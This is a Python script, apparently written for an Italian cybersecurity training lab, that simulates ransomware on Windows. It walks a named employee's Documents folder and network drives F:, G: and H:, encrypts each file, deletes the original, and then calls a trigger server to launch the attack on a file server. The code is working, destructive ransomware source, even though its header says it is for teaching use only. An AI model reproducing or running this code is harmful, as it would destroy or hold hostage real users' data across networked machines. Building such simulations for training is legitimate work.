#!/usr/bin/env python3
"""
IronVault — Simulazione Ransomware (Windows)
DN Security Labs — ITS Academy Tech Talent Factory 2024-2026

SOLO USO DIDATTICO — Cifra le cartelle di rete F: G: H: e
Documents di Laura Bianchi, poi invia segnale al trigger server
Ubuntu per avviare l'attacco anche sul file server.

NON usare al di fuori del contesto didattico ITS.
"""

import os
import time
import urllib.request
from cryptography.fernet import Fernet

TARGET_DIRS = [
    r"C:\Users\laura.bianchi\Documents",
    r"F:\\",
    r"G:\\",
    r"H:\\"
]
KEY_FILE = r"C:\Users\laura.bianchi\chiave_demo.key"
TRIGGER_URL = "http://192.168.143.140:8888/attacca"
EXCLUDE_EXTENSIONS = {".locked", ".key", ".py", ".lnk", ".bat", ".html", ".hta"}


def cifra_file(cipher, path):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        with open(path + '.locked', 'wb') as f:
            f.write(cipher.encrypt(data))
        os.remove(path)
        return True
    except Exception:
        return False


def main():
    # Genera chiave e cifra
    k = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(k)
    cipher = Fernet(k)

    cifrati = 0
    for target in TARGET_DIRS:
        if not os.path.exists(target):
            continue
        for root, dirs, files in os.walk(target):
            for filename in files:
                ext = os.path.splitext(filename)[1].lower()
                if ext in EXCLUDE_EXTENSIONS:
                    continue
                filepath = os.path.join(root, filename)
                if cifra_file(cipher, filepath):
                    cifrati += 1
                    time.sleep(0.2)

    # Segnale al trigger server Ubuntu
    try:
        urllib.request.urlopen(TRIGGER_URL, timeout=5)
    except Exception:
        pass


if __name__ == "__main__":
    main()
